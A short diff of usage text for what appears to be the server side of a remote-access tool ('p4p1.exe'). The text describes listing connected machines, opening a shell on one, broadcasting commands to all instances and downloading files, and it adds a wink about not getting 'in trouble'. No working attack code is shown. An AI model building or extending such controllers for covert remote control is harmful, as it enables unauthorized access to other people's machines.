@@ -6,8 +6,8 @@ def usage_shell():
     print "commands with the * 'astericks' in front are not available yet"
     print "they are comming soon :D"
     print "list -> show all connected ip's"
-    print "*connect [ip] -> setup a shell to interact with a given ip"
-    print "*sendall [cmd] -> send the command to all of the connected instances"
+    print "connect ip -> setup a shell to interact with a given ip"
+    print "*sendall cmd -> send the command to all of the connected instances"
     print "exit -> will exit of the interpreter"
     print "help -> show this message"
     print "wget [url] -> download file from the web"
@@ -18,5 +18,6 @@ def usage_bin():
     print " - This program is the server for p4p1.exe"
     print " - please port forward you're router if you are not using this"
     print " - on you're local network."
+    print " - don't get yourself in trouble with this ;)"
     sys.exit(1)
 
